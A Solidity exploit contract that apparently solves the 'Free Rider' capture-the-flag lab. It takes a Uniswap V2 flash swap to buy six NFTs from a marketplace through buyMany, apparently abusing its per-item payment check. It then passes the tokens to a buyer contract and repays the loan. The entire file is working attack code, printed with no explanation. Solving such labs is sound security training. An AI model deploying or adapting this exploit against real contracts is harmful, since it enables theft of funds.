// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface IBuyer {
    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory
    ) external returns (bytes4);
}

interface INFTMarket {
    function buyMany(uint256[] calldata tokenIds) external payable;
}

interface IWETH is IERC20 {
    function withdraw(uint256 wad) external;

    function deposit() external payable;
}

interface IUniswapV2Pair {
    function balanceOf(address owner) external view returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves()
        external
        view
        returns (
            uint112 reserve0,
            uint112 reserve1,
            uint32 blockTimestampLast
        );

    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;
}

contract HackFreeRider is IERC721Receiver {
    IBuyer immutable buyer;
    IERC721 immutable nft;
    IUniswapV2Pair immutable pair;
    address immutable attacker;
    IWETH immutable WETH;
    INFTMarket immutable market;
    uint256[] IDS = [0, 1, 2, 3, 4, 5];

    constructor(
        address _buyer,
        address _nft,
        address _pair,
        address _attacker,
        address _weth,
        address _market
    ) {
        buyer = IBuyer(_buyer);
        nft = IERC721(_nft);
        pair = IUniswapV2Pair(_pair);
        attacker = _attacker;
        WETH = IWETH(_weth);
        market = INFTMarket(_market);
    }

    function attack() external {
        address token0 = pair.token0();
        address token1 = pair.token1();

        if (token0 == address(WETH)) {
            pair.swap(15 ether, 0, address(this), "pwn");
        } else {
            pair.swap(0, 15 ether, address(this), "pwn");
        }
    }

    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external {
        WETH.withdraw(WETH.balanceOf(address(this)));

        market.buyMany{value: 15 ether}(IDS);

        nft.setApprovalForAll(address(buyer), true);

        for (uint256 i = 0; i < IDS.length; i++) {
            nft.safeTransferFrom(address(this), address(buyer), IDS[i], "");
        }

        WETH.deposit{value: 16 ether}();

        WETH.transfer(address(pair), 16 ether);
    }

    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory
    ) external override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
